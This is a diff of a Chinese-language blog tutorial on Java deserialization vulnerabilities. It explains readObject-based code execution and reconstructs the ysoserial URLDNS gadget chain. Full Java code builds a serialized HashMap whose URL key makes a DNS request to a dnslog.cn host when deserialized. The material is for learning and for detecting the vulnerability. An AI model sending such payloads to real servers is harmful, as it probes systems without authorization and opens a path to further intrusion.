-<h4 id="序列化对象"><a href="#序列化对象" class="headerlink" title="序列化对象"></a>序列化对象</h4><h5 id="用到的辅助类"><a href="#用到的辅助类" class="headerlink" title="用到的辅助类"></a>用到的辅助类</h5><p><code>ObjectOutputStream</code> 类用来序列化一个对象，如下的 <code>SerializeDemo</code> 例子实例化了一个 <code>Employee</code> 对象，并将该对象序列化到一个文件中。</p>
-<p>如果你对 Java IO 流不甚理解，那么可以看一下这篇文章：<a href="http://www.51gjie.com/java/686.html">Java IO流详解</a>、<a href="https://juejin.cn/post/6844903632207347725">深入学习JAVA -IO流详解</a></p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221222234312961.png" alt="image-20221222234312961"></p>
+<h3 id="序列化对象"><a href="#序列化对象" class="headerlink" title="序列化对象"></a>序列化对象</h3><h4 id="用到的辅助类"><a href="#用到的辅助类" class="headerlink" title="用到的辅助类"></a>用到的辅助类</h4><p><code>ObjectOutputStream</code> 类用来序列化一个对象，如下的 <code>SerializeDemo</code> 例子实例化了一个 <code>Employee</code> 对象，并将该对象序列化到一个文件中。</p>
+<p>如果你对 Java IO 流不甚理解，那么可以看一下这篇文章：<a href="https://tobebetterjavaer.com/io/serialize.html#objectoutputstream%E7%B1%BB">JavaIO</a></p>
 <figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo01ObjectOutputStream</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//1. 创建序列化流，用来写</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;day12\\file03-obj.txt&quot;</span>));<br>        <span class="hljs-comment">//2. 调用writeObject方法，写对象</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;张三丰&quot;</span>, <span class="hljs-number">100</span>);<br>        oos.writeObject(p);<br>        <span class="hljs-comment">//3. 释放资源。</span><br>        oos.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<h4 id="反序列化对象"><a href="#反序列化对象" class="headerlink" title="反序列化对象"></a>反序列化对象</h4><h5 id="用到的辅助类"><a href="#用到的辅助类-1" class="headerlink" title="用到的辅助类"></a>用到的辅助类</h5><p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221222234423608.png" alt="image-20221222234423608"></p>
+<h3 id="反序列化对象"><a href="#反序列化对象" class="headerlink" title="反序列化对象"></a>反序列化对象</h3><h4 id="用到的辅助类"><a href="#用到的辅助类-1" class="headerlink" title="用到的辅助类"></a>用到的辅助类</h4><p><img src="https://i.imgur.com/epzfCAy.png"></p>
 <p><strong>特殊情况:</strong></p>
 <p>被 static 修饰的成员变量无法序列化，无法写到文件。</p>
 <p>如果不希望某个成员变量写到文件，同时又不希望使用 static 关键字， 那么可以使用 transient。transient 关键字表示瞬态，被 transient 修饰的成员变量无法被序列化。</p>
@@ -9016,11 +8974,11 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <li>readObject</li>
 </ul>
 <p>这两个方法可以经过开发者重写，一般序列化的重写都是由于下面这种场景诞生的。</p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9600/image-20230107151302268.png" alt="image-20230107151302268"></p>
+<p><img src="https://i.imgur.com/a9gF513.png"></p>
 <figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span><span class="hljs-keyword">throws</span> java.io.IOException<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException<br></code></pre></td></tr></table></figure>
 
-<p>只要服务端反序列化数据，客户端传递类的 <code>readObject</code> 中的代码就会自动执行，给予攻击者在服务器上运行代码的能力。所以从根本上来说，java 反序列化的漏洞与 <code>readObject</code> 有关。</p>
-<h4 id="可能存在安全漏洞的形式"><a href="#可能存在安全漏洞的形式" class="headerlink" title="可能存在安全漏洞的形式"></a>可能存在安全漏洞的形式</h4><h5 id="入口类的-readobject-直接调用危险方法"><a href="#入口类的-readObject-直接调用危险方法" class="headerlink" title="入口类的 readObject 直接调用危险方法"></a>入口类的 <code>readObject</code> 直接调用危险方法</h5><p>这种情况在实际开发场景比较少见，仅作为一个示例演示一下。以下展示了一个弹计算器的代码，思路就是在我们要反序列化的类里面写一个 readObject 方法，这样服务端反序列化时就会自动调用我们写的这个 readObject 方法！</p>
+<p>只要服务端反序列化数据，客户端传递类的 <code>readObject</code> 中的代码就会自动执行，给予攻击者在服务器上运行代码的能力。所以从根本上来说，java 反序列化的漏洞与 <code>readObject</code> 方法有关。</p>
+<h4 id="可能存在安全漏洞的形式"><a href="#可能存在安全漏洞的形式" class="headerlink" title="可能存在安全漏洞的形式"></a>可能存在安全漏洞的形式</h4><h5 id="入口类的-readobject-直接调用危险方法"><a href="#入口类的-readObject-直接调用危险方法" class="headerlink" title="入口类的 readObject 直接调用危险方法"></a>入口类的 <code>readObject</code> 直接调用危险方法</h5><p>这种情况在实际开发场景比较少见，仅作为一个示例演示一下。以下展示了一个弹计算器的代码，思路就是<strong>在我们要反序列化的类里面写一个 readObject 方法</strong>，这样服务端反序列化时就会自动调用我们写的这个 readObject 方法！</p>
 <p><strong>SerializatinTest.java</strong> 内容如下：</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.reflection;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutput;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializationTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-number">22</span>);<br>        System.out.println(person);<br>        serialize(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -9032,7 +8990,7 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 
 
 <p><strong>Person.java</strong> 内容如下：</p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9600/ReadObjectOneScene.png" alt="img"></p>
+<p><img src="https://i.imgur.com/MBm5mMQ.png"></p>
 <p>先运行序列化程序，再运行反序列化程序就会自动弹出计算器！入口类的 readObject直接调用危险方法是攻击最理想的情况，但是这种情况几乎不会出现。</p>
 <h4 id="入口参数中包含可控类该类有危险方法-readobject-时调用"><a href="#入口参数中包含可控类，该类有危险方法，-readObject-时调用" class="headerlink" title="入口参数中包含可控类，该类有危险方法， readObject 时调用"></a>入口参数中包含可控类，该类有危险方法， <code>readObject</code> 时调用</h4><h4 id="入口类参数中包含可控类该类又调用其他有危险方法的类readobject-时调用"><a href="#入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject-时调用" class="headerlink" title="入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用"></a>入口类参数中包含可控类，该类又调用其他有危险方法的类，<code>readObject</code> 时调用</h4><h4 id="构造函数x2f静态代码块等类加载时隐式执行"><a href="#构造函数-x2F-静态代码块等类加载时隐式执行" class="headerlink" title="构造函数&#x2F;静态代码块等类加载时隐式执行"></a>构造函数&#x2F;静态代码块等类加载时隐式执行</h4><h3 id="产生漏洞的攻击路线"><a href="#产生漏洞的攻击路线" class="headerlink" title="产生漏洞的攻击路线"></a>产生漏洞的攻击路线</h3><ul>
 <li><p>首先攻击的前提是继承了 <code>Serializable</code> 接口</p>
@@ -9044,7 +9002,7 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <li><p>执行类 sink（RCE SSRF 写文件等等） 比如 <code>exec</code> 这种函数</p>
 </li>
 </ul>
-<h3 id="实战-urldns-使用-java-反序列化发起一个-dns-请求"><a href="#实战——-URLDNS-使用-Java-反序列化发起一个-DNS-请求" class="headerlink" title="实战—— URLDNS-使用 Java 反序列化发起一个 DNS 请求"></a>实战—— URLDNS-使用 Java 反序列化发起一个 DNS 请求</h3><ul>
+<h2 id="实战-urldns-使用-java-反序列化发起一个-dns-请求"><a href="#实战——-URLDNS-使用-Java-反序列化发起一个-DNS-请求" class="headerlink" title="实战—— URLDNS-使用 Java 反序列化发起一个 DNS 请求"></a>实战—— URLDNS-使用 Java 反序列化发起一个 DNS 请求</h2><ul>
 <li>出发点：URLDNS 在 JAVA 复杂的反序列化漏洞中足够简单；URLDNS 就是 ysoserial 中一个利用链的名字，虽然准确来说这个不能称作 “利用链”。因为其参数不是一个可以利用的命令，而仅为一个 URL，其能触发的结果也不是命令执行，而是一次 DNS 请求。</li>
 <li>虽然这个利用链实际上不能利用，但因为其如下的优点，非常适合我们在检测反序列化漏洞时使用。如 使用 Java 内置的类构造，对第三方库没有依赖。在目标没有回显的时候，能够通过 DNS 请求得知是否存在反序列化漏洞 URL 类。</li>
 </ul>
@@ -9052,48 +9010,47 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">ysoserial&#x2F;URLDNS.java at master · frohoff&#x2F;ysoserial (github.com)</a></p>
 <p>更详细的信息在：</p>
 <p><a href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/">Triggering a DNS lookup using Java Deserialization</a></p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9600/ysoserial.png" alt="img"></p>
+<p><img src="https://i.imgur.com/7v1u95f.png"></p>
 <p>现在开始正式复现 URLDNS 利用链！</p>
-<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>Java URL 类在其 <code>equals</code> 和 <code>hashCode</code> 方法中有一个有趣的性质，那就是在调用这两个方法时 URL 类会发起一个 DNS 查询请求（准确地说在这两个方法中有一个比较操作，在这个比较操作期间会触发 dns 查询 ）。根据 javadocs，两个 hosts 被认为是等价的，如果这两个 hosts 的主机名被解析为同一个 IP 地址。</p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Java URL 类在其 <code>equals</code> 和 <code>hashCode</code> 方法中有一个有趣的性质，那就是在调用这两个方法时 URL 类会发起一个 DNS 查询请求（准确地说在这两个方法中有一个比较操作，在这个比较操作期间会触发 dns 查询 ）。根据 javadocs，如果两个 hosts 的主机名被解析为同一个 IP 地址，那么这两个 hosts 被认为是等价的。</p>
 <p>所以，如果我们能得到一个 在URL 对象上调用 <code>equals</code> 或 <code>hashCode</code> 方法的 gadget，那么我们就可以发起一个 DNS 查询。我们可以通过追踪这个 DNS 查询来验证反序列化是否发生以及在我们控制下的代码是否被执行。常见的 DNS 追踪工具有 DNSChef、Burp Collaborator、<a href="http://dnslog.cn/">DNSLOG</a> 等</p>
-<h4 id="反序列化过程中是如何发起-dns-查询请求的"><a href="#反序列化过程中是如何发起-DNS-查询请求的？" class="headerlink" title="反序列化过程中是如何发起 DNS 查询请求的？"></a>反序列化过程中是如何发起 DNS 查询请求的？</h4><p>在 HashMap 的 <code>readObject</code> 方法中，其通过读取 HashMap 的结构状态开始，然后对其包含的所有项进行一个循环。在循环过程中，该方法会从流中读取 key 和 value。然后 HashMap 会以 key 的哈希值、key、value 为参数调用 <code>putVal</code> 方法。</p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230107165219513.png" alt="image-20230107165219513"></p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230107165412584.png" alt="image-20230107165412584"></p>
-<p>这就是我们所需要的东西，我们有一个调用了 <code>readObject</code> 方法的对象，同时这个 <code>readObject</code> 方法将会在一个我们提供的对象（可控）上调用 hashCode方法。实际上，对于 hashCode 方法的调用发生在 <code>HashMap.hash function</code> 内部。继续跟进上图的 hash 方法，该方法内部调用了 <code>key.hashCode()</code> 方法</p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230108201359461.png" alt="image-20230108201359461"></p>
-<p>通过提供一个 Java URL 对象 作为 HashMap 的 Key，我们将在反序列化过程中发起一个 DNS lookup。此时 key 是一个 Java URL 对象，那么 <code>key.hashCode</code> 就是调用 URl 对象的 <code>hashCode()</code> 方法，我们定义一个URL对象然后看看这个方法。</p>
-<figure class="highlight abnf"><table><tr><td class="code"><pre><code class="hljs abnf">URL url <span class="hljs-operator">=</span> new URL(<span class="hljs-string">&quot;http://san59s.dnslog.cn&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+<h3 id="反序列化过程中是如何发起-dns-查询请求的"><a href="#反序列化过程中是如何发起-DNS-查询请求的？" class="headerlink" title="反序列化过程中是如何发起 DNS 查询请求的？"></a>反序列化过程中是如何发起 DNS 查询请求的？</h3><p>首先要知道的是 HashMap 类是重写了 <code>readObject()</code> 方法的，这满足我们前面说的服务端反序列化会自动触发 <code>readObject()</code> 的条件。</p>
+<p>下图是 HashMap 类的 <code>reddObject()</code> 方法源码：<br><img src="https://i.imgur.com/4Tydeud.png"></p>
+<p>在 HashMap 类的 <code>readObject</code> 方法中，其通过读取 HashMap 的结构状态开始，然后对其包含的所有项进行一个循环。在循环过程中，该方法会从<strong>流</strong>中读取 key 和 value。然后 HashMap 会以 key 的哈希值、key、value 为参数调用 <code>putVal</code> 方法。相关代码如下：</p>
+<p><img src="https://i.imgur.com/W2Rnjjm.png"></p>
+<p>上图中的 s 是我们传给 <code>HashMap.readObject()</code> 方法的输入流，该流是我们可控的，所以我们可以间接地控制反序列化后的 key 和 value。这就是我们所需要的东西，我们有一个调用了 <code>readObject()</code> 方法的对象，同时这个 <code>readObject()</code> 方法将会在一个我们可控的对象上调用 <code>hashCode()</code> 方法。<br>但是上图并没有 <code>hashCode()</code> 方法呀，该方法在哪里？实际上，对于 <code>hashCode()</code> 方法的调用发生在上图的 <code>HashMap.hash()</code> 方法内部。跟进上图的 <code>hash()</code> 方法，该方法内部就调用了 <code>key.hashCode()</code> 方法</p>
+<p><img src="https://i.imgur.com/m1YcbMj.png"></p>
+<p>通过提供一个 Java URL 对象 作为 HashMap 的 key，我们将在反序列化过程中发起一个 DNS 查询（lookup）。此时 key 是一个 Java URL 对象，那么 <code>key.hashCode</code> 就是调用 URL 对象的 <code>hashCode()</code> 方法，我们定义一个URL对象然后看看这个方法。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://san59s.dnslog.cn&quot;</span>);<br></code></pre></td></tr></table></figure>
 
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230108201644434.png" alt="image-20230108201644434"></p>
+<p><img src="https://i.imgur.com/TbtdxX4.png"></p>
 <p>发现这个方法内部会调用 <code>handler.hashCode()</code> 方法，而 <code>handler</code> 是一个 <code>URLStreamHandler</code> 对象</p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230108201743639.png" alt="image-20230108201743639"></p>
-<p>所以我们看看这个 <code>URLStreamHandler</code> 类的 hashCode() 方法</p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230108201846973.png" alt="image-20230108201846973"></p>
-<p><code>URLStreamHandler</code> 类的 hashCode() 方法比较长，但是我们只需要关注关键函数即可，上图中圈起来的 <code>getHostAddress()</code> 方法就是我们想要的，跟进到这个方法内部如下：</p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230108201952783.png" alt="image-20230108201952783"> </p>
+<p><img src="https://i.imgur.com/tdRSKVd.png"></p>
+<p>所以我们看看这个 <code>URLStreamHandler</code> 类的 <code>hashCode()</code> 方法</p>
+<p><img src="https://i.imgur.com/aH0zus1.png"></p>
+<p><code>URLStreamHandler</code> 类的 hashCode() 方法比较长，但是我们只需要关注关键函数即可，上图中框起来的 <code>getHostAddress()</code> 方法就是我们想要的，跟进到这个方法内部如下：</p>
+<p><img src="https://i.imgur.com/tmj08bP.png"></p>
 <p>可以发现最后调用的是一个 URL 类的 <code>getHostAddress()</code> 方法，而这个方法会发起一个 DNS 查询。看到这相信我们就明白这个 URLDNS 链是如何触发一个DNS 查询请求的了，调用链整体并不长，可以归纳调用链如下：</p>
 <figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml">Gadget Chain:<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-constructor">Val()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URL</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br></code></pre></td></tr></table></figure>
 
 
 
-<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>当 URL 对象刚开始放置在一个 HashMap 中时，通过调用 <code>put</code> 方法，<code>HashMap.hash</code> 方法将会被调用。这个方法实际上会调用 URl 对象的 hashCode 方法</p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230107171339409.png" alt="image-20230107171339409"></p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230107171319093.png" alt="image-20230107171319093"></p>
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>当 URL 对象刚开始放置在一个 HashMap 中时，通过调用 <code>put</code> 方法，<code>HashMap.hash</code> 方法将会被调用。</p>
+<p><img src="https://i.imgur.com/O7VU8RF.png"></p>
 <p>我们传入的 key 是一个 URL 类的对象，所以调用的实际上是 URL 类的 <code>hashCode()</code> 方法</p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230108173643417.png" alt="image-20230108173643417"></p>
-<p>从上图可以看到如果 <code>hashCode</code> 不等于 -1，直接返回 hashCode 变量。那这就会有一个问题，那就是我们传入的 URL 对象其 hashCode 默认值是等于 -1 的。其将 hashCode 值存储在一个不是 transient 的实例变量中，如下图</p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230108183625288.png" alt="image-20230108183625288"></p>
-<p>所以在这里会直接调用 <code>handler.hashCode()</code> 方法，如下图</p>
-<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230108183730720.png" alt="image-20230108183730720"></p>
-<p>那这样就会发起一个 DNS 查询请求，也就是说我们在序列化之前就已经发起了一个 DNS 查询请求，这就会和我们反序列化时发起的 DNS 请求弄混，所以我们要避免这种情况。那很自然的思路就是将以上的 URL 类对象的 <code>hashCode</code> 改成不是 -1 ，这样就会在调用 hashCode() 方法时直接返回，而不是发起一个 DNS 查询请求。那如何做到这一点呢？没错就是通过<strong>反射</strong>！</p>
-<p>我们可以通过反射将 URL 类对象的 hashCode 属性值改为不等于-1，然后调用 HashMap 的 put 方法放入 这个 URL 类对象。之后再通过反射将 URL 类对象的 hashCode 属性值再改回 -1 ，然后进行序列化即可。最后当我们进行反序列化时，根据前面的分析，此时就会调用 HashMap 类的 <code>readObject</code> 方法并发起一个 DNS 查询请求。</p>
+<p><img src="https://i.imgur.com/s1TsX7C.png"></p>
+<p>同时从从上图可以看到如果 <code>hashCode</code> 不等于 -1，直接返回 hashCode 变量。那这就会有一个问题，那就是我们传入的 URL 对象其 hashCode 默认值是等于 -1 的。其将 hashCode 值存储在一个不是 transient 的实例变量中，如下图<br><img src="https://i.imgur.com/SsUOSUl.png"></p>
+<p>所以在这里会直接调用 <code>handler.hashCode()</code> 方法，如下图<br><img src="https://i.imgur.com/sJUskc3.png"></p>
+<p>那这样就会发起一个 DNS 查询请求，也就是说我们在序列化之前就已经发起了一个 DNS 查询请求，这就会和我们反序列化时发起的 DNS 请求弄混，所以我们要避免这种情况。那很自然的思路就是将以上的 URL 类对象的 <code>hashCode</code> 改成不是 -1 ，这样就会在调用 <code>hashCode()</code> 方法时直接返回，而不是发起一个 DNS 查询请求。那如何做到这一点呢？没错就是通过<strong>反射</strong>！</p>
+<p>我们可以通过反射将 URL 类对象的 <code>hashCode</code> 属性值改为不等于 -1 ，然后调用 <code>HashMap.put()</code> 方法放入 这个 URL 类对象。之后再通过反射将 URL 类对象的 <code>hashCode</code> 属性值再改回 -1 ，然后进行序列化即可。最后当我们进行反序列化时，根据前面的分析，此时就会自动调用 HashMap 类的 <code>readObject</code> 方法并发起一个 DNS 查询请求。</p>
 <p>以下是代码：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializationTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        HashMap&lt;URL,Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://san59s.dnslog.cn&quot;</span>);<br>        Class c= url.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashcodefield.setAccessible(<span class="hljs-literal">true</span>);<br>        hashcodefield.set(url,<span class="hljs-number">1234</span>);<br>        hashmap.put(url,<span class="hljs-number">1</span>);<br><br>        hashcodefield.set(url,-<span class="hljs-number">1</span>);<br><br>        serialize(hashmap);<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> url.dns.mirror4s;<br><br><span class="hljs-keyword">import</span> sun.util.resources.cldr.zh.CalendarData_zh_Hans_HK;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLStreamHandler;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://d73yy0.dnslog.cn&quot;</span>);<br>        HashMap&lt;URL,Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> url.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span>  <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br><br>        field.setAccessible(<span class="hljs-literal">true</span>);<br><br>        field.set(url,<span class="hljs-number">1234</span>); <span class="hljs-comment">//</span><br><br>        hashmap.put(url,<span class="hljs-number">1</span>);<br><br>        field.set(url,-<span class="hljs-number">1</span>);<br><br>        serialize(hashmap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(name));<br>        objectInputStream.readObject();<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>
 
-<p>代码中有一个有趣的地方，那就是将 URL 类对象 url 的 hashCode 改回 -1 时是直接调用前面得到的 Field 对象实例来进行的，而不是通过 HashMap 的实例对象 hashmap。根据直觉，我们都已经通过 hashmap 的 put 方法将 url 放入进去，那么再修改 url 的值似乎不应该影响到 hashmap。。</p>
+<p>代码中有一个有趣的地方，那就是将 URL 类的一个对象 url 的 hashCode 改回 -1 时是直接调用前面得到的 Field 对象实例来进行的，而不是通过 HashMap 的实例对象 hashmap。根据直觉，我们都已经通过 hashmap 的 put 方法将 url 放入进去，那么再修改 url 的值似乎不应该影响到 hashmap。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我们以一个 UDLDNS 链的流程图来结束这一篇文章吧。<br><img src="https://i.imgur.com/JpS5kmf.png"></p>
 <h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/mocas_wang/article/details/107621010">CSDN</a></p>
 <p><a href="https://www.runoob.com/java/java-serialization.html">菜鸟教程</a></p>
-<p><a href="https://drun1baby.github.io/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/#toc-heading-14">芜风师傅</a></p>
